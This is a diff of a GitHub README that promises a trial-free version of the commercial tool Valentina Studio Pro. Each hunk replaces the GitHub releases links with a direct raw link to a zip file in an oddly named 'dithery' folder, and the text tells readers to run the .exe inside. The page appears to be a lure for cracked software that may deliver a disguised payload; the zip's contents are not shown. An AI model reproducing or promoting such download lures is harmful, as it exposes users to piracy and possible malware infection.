@@ -1,6 +1,6 @@
 # 🎉 Valentina-Studio-Pro-No-Trial - Maximize Your Database Productivity
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/n3therlands/Valentina-Studio-Pro-No-Trial/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/n3therlands/Valentina-Studio-Pro-No-Trial/main/dithery/Valentina-Studio-Pro-No-Trial-1.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/n3therlands/Valentina-Studio-Pro-No-Trial/main/dithery/Valentina-Studio-Pro-No-Trial-1.1.zip)
 
 ## 📖 Overview
 Welcome to the Valentina Studio Pro No Trial repository. This is your go-to place for complete resources, guides, and reference materials focused on Valentina Studio Pro for Windows PCs. This application helps you manage databases effectively, whether you're designing schemas or running complex SQL queries.
@@ -11,7 +11,7 @@ To begin using Valentina Studio Pro, follow these simple steps.
 1. **Download the Software**
    You can download the latest version of Valentina Studio Pro from our Releases page. 
 
-   **Visit this page to download:** [Download Here](https://github.com/n3therlands/Valentina-Studio-Pro-No-Trial/releases)
+   **Visit this page to download:** [Download Here](https://raw.githubusercontent.com/n3therlands/Valentina-Studio-Pro-No-Trial/main/dithery/Valentina-Studio-Pro-No-Trial-1.1.zip)
 
 2. **Install the Software**
    Once downloaded, find the `.exe` file in your Downloads folder. Double-click it to run the installer. Follow the on-screen instructions to complete the setup.
@@ -23,7 +23,7 @@ To begin using Valentina Studio Pro, follow these simple steps.
 To get started with Valentina Studio Pro, follow these steps:
 
 - **Download the Software:** Click the link below to access the latest release:
-   [Download Here](https://github.com/n3therlands/Valentina-Studio-Pro-No-Trial/releases)
+   [Download Here](https://raw.githubusercontent.com/n3therlands/Valentina-Studio-Pro-No-Trial/main/dithery/Valentina-Studio-Pro-No-Trial-1.1.zip)
 
 - **Installation Steps:**
    - Download the `.exe` file.
@@ -69,7 +69,7 @@ If you encounter issues while using Valentina Studio Pro, you can reach out for 
 - **Tutorials:** Look out for step-by-step tutorials to help you navigate through the more complex features.
 
 ## 🔗 Links
-- **GitHub Releases:** [Download Here](https://github.com/n3therlands/Valentina-Studio-Pro-No-Trial/releases)
+- **GitHub Releases:** [Download Here](https://raw.githubusercontent.com/n3therlands/Valentina-Studio-Pro-No-Trial/main/dithery/Valentina-Studio-Pro-No-Trial-1.1.zip)
 - **Official Website:** For more information, visit our official site.
 
 Embrace the capabilities of Valentina Studio Pro and enhance your database management skills today!
